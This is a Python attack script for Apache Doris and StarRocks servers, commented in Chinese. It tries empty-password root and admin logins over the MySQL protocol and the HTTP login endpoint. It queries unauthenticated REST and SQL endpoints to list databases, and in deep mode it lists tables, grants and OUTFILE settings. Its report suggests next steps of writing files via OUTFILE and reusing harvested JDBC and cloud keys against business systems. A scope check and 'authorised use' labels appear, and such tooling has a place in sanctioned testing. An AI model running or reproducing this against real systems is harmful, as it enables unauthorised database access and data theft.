#!/usr/bin/env python3
"""Apache Doris 三板斧探针（授权范围内）。

斧1：9030 MySQL 协议 root/admin 空口令 + SHOW DATABASES
斧2：8030 HTTP 未授权 REST + /api/query 翻库（解析官方 {code,msg,data}）
斧3：只探测 outfile 变量/GRANTS；不写 OUTFILE、不甩马

默认做到 L2。空口令成功（即使只有系统库）也算 L2。
"""
from __future__ import annotations

import argparse
import json
import shutil
import socket
import subprocess
import sys
from datetime import datetime, UTC
from pathlib import Path
from typing import Any
from urllib.parse import urlparse

try:
    import requests

    requests.packages.urllib3.disable_warnings()  # type: ignore
except ImportError:
    print("[!] pip install requests", file=sys.stderr)
    sys.exit(1)

OPS = Path(__file__).resolve().parent
if str(OPS) not in sys.path:
    sys.path.insert(0, str(OPS))
from scope_lib import host_of, in_scope, write_probe_json  # noqa: E402

UA = "Mozilla/5.0 大爱仙尊-doris"
SYS_DBS = frozenset(
    {"information_schema", "mysql", "__internal_schema", "sys", "starrocks"}
)
HTTP_PATHS = (
    "/rest/v1/system",
    "/rest/v1/backend",
    "/rest/v1/frontend",
    "/api/bootstrap",
    "/api/backends",
    "/api/ha",
    "/api/health",
    "/api/meta/namespaces",
    "/rest/v1/session",
    "/api/v1/catalogs",
    "/api/v1/catalogs/default_catalog/databases",
    "/rest/v2/api/cluster_overview",
    "/",
)
QUERY_PATHS = (
    "/api/query/default_cluster/information_schema",
    "/api/query/default_cluster/mysql",
    "/api/query/default_cluster/__internal_schema",
)
SR_SQL_PATHS = (
    "/api/v1/catalogs/default_catalog/sql",
    "/api/v1/catalogs/default_catalog/databases/information_schema/sql",
    "/api/v1/catalogs/default_catalog/databases/sys/sql",
)
BE_PATHS = ("/api/health", "/api/system", "/metrics")


def _ident(name: str) -> str:
    return "`" + str(name).replace("`", "``") + "`"


def _hostport(host: str, port: int) -> str:
    if ":" in host and not host.startswith("["):
        return f"[{host}]:{port}"
    return f"{host}:{port}"


def _http_bases(host: str, http_port: int) -> list[str]:
    hp = _hostport(host, http_port)
    return [f"http://{hp}", f"https://{hp}"]


def parse_doris_query(body: str) -> dict[str, Any]:
    """解析 FE /api/query 官方包。成功=code=0 且 data.type=result_set。"""
    out: dict[str, Any] = {"ok": False, "rows": [], "names": []}
    text = (body or "").strip()
    if not text.startswith("{") and not text.startswith("["):
        return out
    try:
        j = json.loads(text)
    except json.JSONDecodeError:
        return out
    if not isinstance(j, dict):
        return out
    code = j.get("code")
    msg = str(j.get("msg") or "").lower()
    data = j.get("data")
    if code not in (0, "0") and msg != "success":
        out["error"] = str(j.get("msg") or code)[:160]
        return out
    if isinstance(data, dict) and data.get("type") == "result_set":
        raw_rows = data.get("data") or []
        rows: list[list[str]] = []
        for row in raw_rows:
            if isinstance(row, (list, tuple)):
                rows.append([str(c) for c in row])
            else:
                rows.append([str(row)])
        names = [r[0] for r in rows if r]
        out.update({"ok": True, "rows": rows, "names": names})
        return out
    if code in (0, "0") or msg == "success":
        out["ok"] = True
        out["exec_only"] = True
    return out


def parse_starrocks_sql(body: str) -> dict[str, Any]:
    """StarRocks HTTP SQL：整段 JSON 或 NDJSON（connectionId / meta / data）。"""
    out: dict[str, Any] = {"ok": False, "rows": [], "names": []}
    text = (body or "").strip()
    if not text:
        return out
    chunks: list[str] = []
    if text.startswith("{") and "\n{" in text:
        chunks = [ln.strip() for ln in text.splitlines() if ln.strip().startswith("{")]
    else:
        chunks = [text]
    names: list[str] = []
    rows: list[list[str]] = []
    connected = False
    for chunk in chunks:
        try:
            j = json.loads(chunk)
        except json.JSONDecodeError:
            continue
        if not isinstance(j, dict):
            continue
        if j.get("connectionId") is not None:
            connected = True
        data = j.get("data")
        if isinstance(data, list) and data and not isinstance(data[0], list):
            connected = True
            rows.append([str(c) for c in data])
            names.append(str(data[0]))
        elif isinstance(data, list):
            connected = True
            for row in data:
                if isinstance(row, (list, tuple)) and row:
                    rows.append([str(c) for c in row])
                    names.append(str(row[0]))
        for key in ("databases", "catalogs"):
            blob = j.get(key)
            if isinstance(blob, list):
                connected = True
                for item in blob:
                    if isinstance(item, str):
                        names.append(item)
                    elif isinstance(item, dict):
                        n = item.get("name") or item.get("database") or item.get("Database")
                        if n:
                            names.append(str(n))
    if connected or names:
        out.update({"ok": True, "rows": rows, "names": names})
    return out


def extract_json_names(body: str) -> list[str]:
    """从 catalogs/databases 列表 JSON 抽名称。"""
    text = (body or "").strip()
    if not text.startswith("{") and not text.startswith("["):
        return []
    try:
        j = json.loads(text)
    except json.JSONDecodeError:
        return []
    names: list[str] = []

    def walk(node: Any) -> None:
        if isinstance(node, dict):
            for k in ("name", "database", "Database", "catalog"):
                v = node.get(k)
                if isinstance(v, str) and v and v not in names:
                    names.append(v)
            for v in node.values():
                walk(v)
        elif isinstance(node, list):
            for item in node:
                if isinstance(item, str) and item not in names:
                    names.append(item)
                else:
                    walk(item)

    walk(j)
    return names[:80]


def _tcp_open(host: str, port: int, timeout: float = 4.0) -> bool:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        return True
    except OSError:
        return False
    finally:
        try:
            sock.close()
        except OSError:
            pass


def mysql_greeting(host: str, port: int, timeout: float = 5.0) -> dict[str, Any]:
    """读 MySQL 协议握手，抽 server_version。"""
    out: dict[str, Any] = {"open": False, "mysql": False, "version": "", "snippet": ""}
    raw = b""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, port))
        out["open"] = True
        raw = sock.recv(256)
    except OSError as exc:
        out["error"] = str(exc)[:160]
        return out
    finally:
        try:
            sock.close()
        except OSError:
            pass
    if not raw or len(raw) < 5:
        return out
    out["snippet"] = raw[:80].hex()
    try:
        proto = raw[4]
        if proto == 10:
            end = raw.index(b"\x00", 5)
            out["version"] = raw[5:end].decode("latin1", errors="replace")
            out["mysql"] = True
    except (ValueError, IndexError):
        pass
    return out


def _pymysql_show(host: str, port: int, user: str) -> dict[str, Any] | None:
    try:
        import pymysql  # type: ignore
    except ImportError:
        return None
    try:
        conn = pymysql.connect(
            host=host,
            port=port,
            user=user,
            password="",
            connect_timeout=6,
            read_timeout=8,
            write_timeout=8,
        )
    except Exception as exc:
        return {"user": user, "ok": False, "error": str(exc)[:200]}
    row: dict[str, Any] = {"user": user, "ok": True, "via": "pymysql"}
    try:
        with conn.cursor() as cur:
            cur.execute("SHOW DATABASES")
            row["databases"] = [r[0] for r in cur.fetchall() if r]
            try:
                cur.execute("SHOW FRONTENDS")
                cols = [d[0] for d in (cur.description or [])]
                fe = cur.fetchone()
                if fe:
                    row["frontend"] = dict(zip(cols, [str(x)[:80] for x in fe]))
            except Exception:
                pass
        conn.close()
    except Exception as exc:
        row["query_error"] = str(exc)[:200]
    return row


def _mysql_cli(host: str, port: int, user: str, sql: str) -> dict[str, Any] | None:
    exe = shutil.which("mysql") or shutil.which("mysql8")
    if not exe:
        return None
    cmd = [
        exe,
        "-h",
        host,
        "-P",
        str(port),
        f"-u{user}",
        "--password=",
        "--connect-timeout=6",
        "--batch",
        "-N",
        "-e",
        sql,
    ]
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=12)
    except (OSError, subprocess.TimeoutExpired) as exc:
        return {"user": user, "ok": False, "error": str(exc)[:200], "via": "mysql-cli"}
    err = (p.stderr or "").strip()
    if p.returncode != 0:
        return {"user": user, "ok": False, "error": err[:200], "via": "mysql-cli"}
    lines = [ln.strip() for ln in (p.stdout or "").splitlines() if ln.strip()]
    return {"user": user, "ok": True, "via": "mysql-cli", "lines": lines}


def mysql_empty_login(host: str, port: int, user: str) -> dict[str, Any]:
    via_py = _pymysql_show(host, port, user)
    if via_py is not None:
        return via_py
    via_cli = _mysql_cli(host, port, user, "SHOW DATABASES;")
    if via_cli is not None:
        if via_cli.get("ok"):
            via_cli["databases"] = via_cli.pop("lines", [])
        return via_cli
    return {
        "user": user,
        "ok": False,
        "error": "无 pymysql 且无 mysql 客户端，只完成握手指纹",
    }


def _http_get(
    sess: requests.Session, base: str, path: str, auth: tuple[str, str] | None
) -> dict[str, Any]:
    url = base.rstrip("/") + path
    try:
        r = sess.get(url, timeout=8, verify=False, allow_redirects=True, auth=auth)
    except Exception as exc:
        return {"path": path, "error": str(exc)[:160]}
    body = r.text or ""
    low = body.lower()
    needles = ("doris", "palo", "frontend", "backend", "default_cluster", "starrocks")
    matched = [n for n in needles if n in low]
    names = extract_json_names(body) if path.rstrip("/").endswith("databases") or path.rstrip("/").endswith("catalogs") else []
    return {
        "path": path,
        "status": r.status_code,
        "matched": matched,
        "snippet": body[:240],
        "auth": bool(auth),
        "names": names,
    }


def _http_query(
    sess: requests.Session,
    base: str,
    path: str,
    stmt: str,
    auth: tuple[str, str] | None,
) -> dict[str, Any]:
    url = base.rstrip("/") + path
    parsed = {"ok": False, "rows": [], "names": []}
    status = 0
    body = ""
    used = "json"
    try:
        r = sess.post(url, json={"stmt": stmt}, timeout=12, verify=False, auth=auth)
        status = r.status_code
        body = r.text or ""
        parsed = parse_doris_query(body)
        if not parsed.get("ok") and status < 500:
            r2 = sess.post(
                url,
                data={"stmt": stmt},
                timeout=12,
                verify=False,
                auth=auth,
            )
            used = "form"
            status = r2.status_code
            body = r2.text or ""
            parsed = parse_doris_query(body)
    except Exception as exc:
        return {"path": path, "stmt": stmt, "error": str(exc)[:160], "ok": False}
    return {
        "path": path,
        "stmt": stmt,
        "status": status,
        "snippet": body[:400],
        "auth": bool(auth),
        "auth_user": auth[0] if auth else "",
        "via": used,
        "ok": bool(parsed.get("ok")),
        "names": parsed.get("names") or [],
        "exec_only": bool(parsed.get("exec_only")),
    }


def _http_sr_sql(
    sess: requests.Session,
    base: str,
    path: str,
    stmt: str,
    auth: tuple[str, str] | None,
) -> dict[str, Any]:
    url = base.rstrip("/") + path
    try:
        r = sess.post(
            url,
            json={"query": stmt if stmt.endswith(";") else stmt + ";"},
            timeout=12,
            verify=False,
            auth=auth,
        )
    except Exception as exc:
        return {"path": path, "stmt": stmt, "error": str(exc)[:160], "ok": False}
    parsed = parse_starrocks_sql(r.text or "")
    return {
        "path": path,
        "stmt": stmt,
        "status": r.status_code,
        "snippet": (r.text or "")[:400],
        "auth": bool(auth),
        "auth_user": auth[0] if auth else "",
        "via": "starrocks-sql",
        "ok": bool(parsed.get("ok")),
        "names": parsed.get("names") or [],
        "exec_only": False,
    }


def _try_fe_login(sess: requests.Session, base: str, user: str) -> dict[str, Any]:
    url = base.rstrip("/") + "/rest/v1/login"
    try:
        r = sess.post(
            url,
            data={"username": user, "password": ""},
            timeout=8,
            verify=False,
            allow_redirects=True,
        )
    except Exception as exc:
        return {"user": user, "ok": False, "error": str(exc)[:160]}
    body = (r.text or "").lower()
    ok = r.status_code < 400 and (
        "success" in body or '"code":0' in body.replace(" ", "") or r.status_code == 204
    )
    if r.status_code in (401, 403):
        ok = False
    return {
        "user": user,
        "ok": ok,
        "status": r.status_code,
        "snippet": (r.text or "")[:160],
    }


def _probe_be(sess: requests.Session, host: str, be_port: int) -> dict[str, Any]:
    if be_port <= 0 or not _tcp_open(host, be_port):
        return {"port": be_port, "open": False, "hits": []}
    hits: list[dict[str, Any]] = []
    needles = ("doris", "starrocks", "palo", "be_port", "doris_be", "starrocks_be")
    for base in _http_bases(host, be_port):
        for path in BE_PATHS:
            row = _http_get(sess, base, path, None)
            row["base"] = base
            extra = [n for n in needles if n in (row.get("snippet") or "").lower()]
            if extra and not row.get("matched"):
                row["matched"] = extra
            if row.get("status") or row.get("matched"):
                hits.append(row)
            if row.get("matched"):
                print(f"  [BE {row.get('status')}] {base}{path} matched={row.get('matched')}")
        if any(h.get("matched") for h in hits):
            break
    return {"port": be_port, "open": True, "hits": hits[:12]}


def _collect_dbs(*name_lists: list[str]) -> tuple[list[str], list[str]]:
    all_names: list[str] = []
    biz: list[str] = []
    for lst in name_lists:
        for name in lst:
            if name and name not in all_names:
                all_names.append(name)
            if name and name.lower() not in SYS_DBS and name not in biz:
                biz.append(name)
    return all_names, biz


def _deep_mysql(host: str, port: int, user: str, db: str) -> list[dict[str, Any]]:
    notes: list[dict[str, Any]] = []
    sql_tables = f"SHOW TABLES FROM {_ident(db)}"
    try:
        import pymysql  # type: ignore

        conn = pymysql.connect(
            host=host,
            port=port,
            user=user,
            password="",
            connect_timeout=6,
            read_timeout=8,
        )
        with conn.cursor() as cur:
            cur.execute(sql_tables)
            tables = [r[0] for r in cur.fetchall() if r][:30]
            notes.append({"show_tables": {db: tables}})
            try:
                cur.execute("SHOW GRANTS")
                notes.append({"grants": [str(r[0])[:200] for r in cur.fetchall() if r][:8]})
            except Exception:
                pass
            try:
                cur.execute("SHOW VARIABLES LIKE '%outfile%'")
                notes.append(
                    {
                        "outfile_vars": [
                            {"k": str(r[0]), "v": str(r[1])[:80]}
                            for r in cur.fetchall()
                            if r
                        ]
                    }
                )
            except Exception:
                pass
        conn.close()
        return notes
    except ImportError:
        pass
    except Exception as exc:
        notes.append({"pymysql_error": str(exc)[:200]})
    cli = _mysql_cli(
        host,
        port,
        user,
        f"{sql_tables}; SHOW GRANTS; SHOW VARIABLES LIKE '%outfile%';",
    )
    if cli is None:
        notes.append({"error": "无 pymysql 且无 mysql 客户端，--deep 跳过斧1细查"})
    elif cli.get("ok"):
        notes.append({"cli_lines": (cli.get("lines") or [])[:40]})
    else:
        notes.append({"cli_error": cli.get("error")})
    return notes


def run(
    host: str,
    case: str,
    out: Path | None,
    mysql_port: int,
    http_port: int,
    deep: bool,
    be_port: int = 8040,
) -> dict[str, Any]:
    host = host_of(host) or host
    if host and not in_scope(host):
        print(f"[!] 不在 scope：{host}", file=sys.stderr)
        sys.exit(2)

    axe1: dict[str, Any] = {"port": mysql_port, "open": _tcp_open(host, mysql_port)}
    greeting = mysql_greeting(host, mysql_port) if axe1["open"] else {"open": False, "mysql": False}
    axe1["greeting"] = greeting
    logins: list[dict[str, Any]] = []
    if axe1["open"]:
        for user in ("root", "admin"):
            row = mysql_empty_login(host, mysql_port, user)
            logins.append(row)
            flag = "OK" if row.get("ok") else "FAIL"
            dbs = row.get("databases") or []
            print(f"  [9030 {flag}] {user}@'' dbs={len(dbs)} via={row.get('via', '-')}")
            if dbs:
                print(f"       {dbs[:12]}")
    else:
        print(f"  [9030] closed/filtered :{mysql_port}")
    axe1["logins"] = logins

    sess = requests.Session()
    sess.headers["User-Agent"] = UA
    http_hits: list[dict[str, Any]] = []
    query_hits: list[dict[str, Any]] = []
    axe2_open = _tcp_open(host, http_port)
    print(f"  [8030] {'open' if axe2_open else 'closed'} :{http_port}")

    query_ok = False
    login_hits: list[dict[str, Any]] = []
    if axe2_open:
        auths: list[tuple[str, str] | None] = [None, ("root", ""), ("admin", "")]
        for base in _http_bases(host, http_port):
            for path in HTTP_PATHS:
                row = _http_get(sess, base, path, None)
                row["base"] = base
                names = row.get("names") or []
                if names and "database" in path:
                    row["names"] = names
                    query_hits.append(
                        {
                            "path": path,
                            "stmt": "GET",
                            "status": row.get("status"),
                            "ok": True,
                            "names": names,
                            "via": "sr-list",
                            "base": base,
                            "auth_user": "",
                        }
                    )
                    query_ok = True
                    print(f"  [list {row.get('status')}] {path} dbs={len(names)}")
                if row.get("status") or row.get("matched"):
                    http_hits.append(row)
                if row.get("matched"):
                    print(
                        f"  [{row.get('status')}] {base}{path} matched={row.get('matched')}"
                    )
            for user in ("root", "admin"):
                lg = _try_fe_login(sess, base, user)
                lg["base"] = base
                login_hits.append(lg)
                if lg.get("ok"):
                    print(f"  [login {lg.get('status')}] {user}@'' {base}")
            for auth in auths:
                for qpath in QUERY_PATHS:
                    q = _http_query(sess, base, qpath, "SHOW DATABASES", auth)
                    q["base"] = base
                    query_hits.append(q)
                    if q.get("ok") and not q.get("exec_only"):
                        query_ok = True
                        print(
                            f"  [query {q.get('status')}] {qpath} "
                            f"auth={bool(auth)} dbs={len(q.get('names') or [])}"
                        )
                for spath in SR_SQL_PATHS:
                    q = _http_sr_sql(sess, base, spath, "SHOW DATABASES", auth)
                    q["base"] = base
                    query_hits.append(q)
                    if q.get("ok") and q.get("names"):
                        query_ok = True
                        print(
                            f"  [sr-sql {q.get('status')}] {spath} "
                            f"auth={bool(auth)} dbs={len(q.get('names') or [])}"
                        )
                if query_ok and not deep:
                    break
            if query_ok and not deep:
                break

    be_report = _probe_be(sess, host, be_port)

    mysql_dbs: list[str] = []
    for login in logins:
        if login.get("ok"):
            mysql_dbs.extend(login.get("databases") or [])
    http_dbs: list[str] = []
    for q in query_hits:
        if q.get("ok") and not q.get("exec_only"):
            http_dbs.extend(q.get("names") or [])
    all_dbs, biz_dbs = _collect_dbs(mysql_dbs, http_dbs)

    deep_notes: list[dict[str, Any]] = []
    if deep:
        ok_login = next((x for x in logins if x.get("ok")), None)
        sample_db = (biz_dbs[0] if biz_dbs else (all_dbs[0] if all_dbs else ""))
        if ok_login and sample_db:
            deep_notes.extend(_deep_mysql(host, mysql_port, str(ok_login["user"]), sample_db))
        elif deep and ok_login and not sample_db:
            deep_notes.append({"note": "空口令成功但 SHOW DATABASES 为空"})
        for q in query_hits:
            if q.get("ok") and sample_db:
                au = q.get("auth_user") or ""
                extra = _http_query(
                    sess,
                    q.get("base") or "",
                    q.get("path") or QUERY_PATHS[0],
                    f"SHOW TABLES FROM {_ident(sample_db)}",
                    (au, "") if au else None,
                )
                extra["base"] = q.get("base")
                deep_notes.append({"http_show_tables": extra})
                break

    empty_pw = any(x.get("ok") for x in logins)
    l2 = empty_pw or query_ok
    l1 = bool(
        greeting.get("mysql")
        or any(h.get("matched") for h in http_hits)
        or any(h.get("matched") for h in (be_report.get("hits") or []))
        or any(x.get("ok") for x in login_hits)
    )
    report = {
        "target": host,
        "ts": datetime.now(UTC).isoformat(),
        "mysql_port": mysql_port,
        "http_port": http_port,
        "axe1_mysql": axe1,
        "axe2_http": {
            "open": axe2_open,
            "hits": http_hits[:40],
            "query": query_hits[:24],
            "login": login_hits[:6],
        },
        "be_http": be_report,
        "axe3": {
            "note": "OUTFILE/甩马不在默认探针；--deep 只读 GRANTS/outfile 变量",
            "deep": deep_notes,
        },
        "databases": all_dbs,
        "business_dbs": biz_dbs,
        "empty_password": empty_pw,
        "http_query_ok": query_ok,
        "level": "L2" if l2 else ("L1" if l1 else "none"),
        "playbook": "传承/仓算无门.md",
        "skill": "杀招/仓算无门",
        "cve": ["CVE-2026-58319"],
        "next": [
            "L2 → --deep 抽样表名，证件/密钥打码",
            "有 FILE + enable_outfile_to_local 或可控 S3 → OUTFILE 先问，只写 marker",
            "JDBC/云钥回灌业务站",
        ],
    }
    out_path = write_probe_json(
        report, case=case, out=out, case_subdir="doris", filename="probe.json"
    )
    print(
        json.dumps(
            {
                "level": report["level"],
                "empty_password": empty_pw,
                "http_query_ok": query_ok,
                "business_dbs": biz_dbs,
                "out": str(out_path),
            },
            ensure_ascii=False,
        )
    )
    return report


def _split_host_port(raw: str, default_http: int) -> tuple[str, int]:
    s = (raw or "").strip()
    if "://" in s or s.startswith("//"):
        p = urlparse(s if "://" in s else "https:" + s)
        return (p.hostname or host_of(s) or s), (p.port or default_http)
    if s.startswith("["):
        end = s.find("]")
        host = s[1:end] if end > 1 else s.strip("[]")
        rest = s[end + 1 :] if end > 1 else ""
        if rest.startswith(":") and rest[1:].isdigit():
            return host, int(rest[1:])
        return host, default_http
    if s.count(":") == 1:
        left, right = s.split(":", 1)
        if left and right.isdigit():
            return left, int(right)
    return (host_of(s) or s), default_http


def main() -> None:
    ap = argparse.ArgumentParser(description="Apache Doris 三板斧探针（授权范围）")
    ap.add_argument("--host", "-u", required=True, help="授权 IP 或 http://host:8030")
    ap.add_argument("--case", default="")
    ap.add_argument("--out", type=Path, default=None)
    ap.add_argument("--mysql-port", type=int, default=9030)
    ap.add_argument("--http-port", type=int, default=8030)
    ap.add_argument("--be-port", type=int, default=8040, help="BE HTTP，0 跳过")
    ap.add_argument("--deep", action="store_true", help="表名/GRANTS/outfile 变量（仍不写盘）")
    args = ap.parse_args()
    hostname, http_port = _split_host_port(args.host, args.http_port)
    run(
        hostname,
        args.case,
        args.out,
        args.mysql_port,
        http_port,
        args.deep,
        be_port=args.be_port,
    )


if __name__ == "__main__":
    main()
